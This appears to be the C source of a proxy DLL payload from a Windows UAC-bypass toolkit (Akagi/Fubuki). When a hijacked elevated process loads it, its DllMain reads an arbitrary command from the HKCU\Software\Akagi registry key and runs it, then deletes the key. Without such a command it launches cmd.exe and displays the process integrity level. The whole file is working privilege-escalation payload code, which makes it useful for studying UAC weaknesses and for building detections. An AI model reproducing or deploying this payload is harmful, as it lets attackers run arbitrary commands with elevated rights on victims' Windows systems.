/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2016
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.10
*
*  DATE:        16 Apr 2016
*
*  Proxy dll entry point, Fubuki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "..\Shared\ntos.h"
#include <ntstatus.h>
#include "..\shared\minirtl.h"
#include "unbcl.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define T_AKAGI_KEY    L"Software\\Akagi"
#define T_AKAGI_PARAM  L"LoveLetter"

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}


/*
* ucmShowProcessIntegrityLevel
*
* Purpose:
*
* Output current integrity level of target application.
*
*/
void ucmShowProcessIntegrityLevel(
    VOID
)
{
    NTSTATUS status;
    HANDLE hToken;

    ULONG LengthNeeded;

    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    DWORD dwIntegrityLevel;
    WCHAR *t = NULL;
    WCHAR szBuffer[MAX_PATH + 1];

    status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(status)) {

        status = NtQueryInformationToken(hToken, TokenIntegrityLevel, NULL, 0, &LengthNeeded);
        if (status == STATUS_BUFFER_TOO_SMALL) {

            pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, LengthNeeded);
            if (pTIL) {
                status = NtQueryInformationToken(hToken, TokenIntegrityLevel, pTIL, LengthNeeded, &LengthNeeded);
                if (NT_SUCCESS(status)) {

                    dwIntegrityLevel = *RtlSubAuthoritySid(pTIL->Label.Sid,
                        (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));

                    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
                    {
                        t = L"Low Process";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
                    {
                        t = L"Medium Process";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
                    {
                        t = L"High Integrity Process";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
                    {
                        t = L"System Integrity Process";
                    }

                    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
                    wsprintf(szBuffer, L"PID=%lu, IntegrityLevel=%ws",
                        GetCurrentProcessId(), t);

                }
                LocalFree(pTIL);
            }
        }
        NtClose(hToken);
    }
    if (t) MessageBox(GetDesktopWindow(), szBuffer, GetCommandLineW(), MB_ICONINFORMATION);
}

/*
* ucmQueryCustomParameter
*
* Purpose:
*
* Query custom parameter and run it.
*
*/
BOOL ucmQueryCustomParameter(
    VOID
)
{
    BOOL                    cond = FALSE, bResult = FALSE;
    HKEY                    hKey = NULL;
    LPWSTR                  lpParameter = NULL;
    LRESULT                 lRet;
    DWORD                   dwSize = 0;
    STARTUPINFOW            startupInfo;
    PROCESS_INFORMATION     processInfo;

    do {
        lRet = RegOpenKeyExW(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, KEY_READ, &hKey);
        if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
            break;
        }

        lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)NULL, &dwSize);
        if (lRet != ERROR_SUCCESS) {
            break;
        }

        lpParameter = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + 1);
        if (lpParameter == NULL) {
            break;
        }

        lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)lpParameter, &dwSize);
        if (lRet == ERROR_SUCCESS) {

            OutputDebugStringW(L"Akagi letter found");
            OutputDebugStringW(lpParameter);

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);
            GetStartupInfoW(&startupInfo);

            bResult = CreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
                NULL, &startupInfo, &processInfo);

            if (bResult) {
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
            }

        }
        HeapFree(GetProcessHeap(), 0, lpParameter);

        RegCloseKey(hKey);
        hKey = NULL;
        RegDeleteKey(HKEY_CURRENT_USER, T_AKAGI_KEY);

    } while (cond);

    if (hKey != NULL) {
        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point, start cmd.exe and exit immediatelly.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    DWORD					cch;
    TCHAR					cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
    STARTUPINFO				startupInfo;
    PROCESS_INFORMATION		processInfo;

    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {

        OutputDebugString(TEXT("Hello, Admiral"));

        if (!ucmQueryCustomParameter()) {

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);
            GetStartupInfoW(&startupInfo);

            RtlSecureZeroMemory(sysdir, sizeof(sysdir));
            cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
            if ((cch != 0) && (cch < MAX_PATH)) {
                RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
                _strcpy(cmdbuf, sysdir);
                _strcat(cmdbuf, TEXT("cmd.exe"));

                if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
                    sysdir, &startupInfo, &processInfo))
                {
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    ucmShowProcessIntegrityLevel();
                }
            }

        }
        ExitProcess(0);
    }
    return TRUE;
}
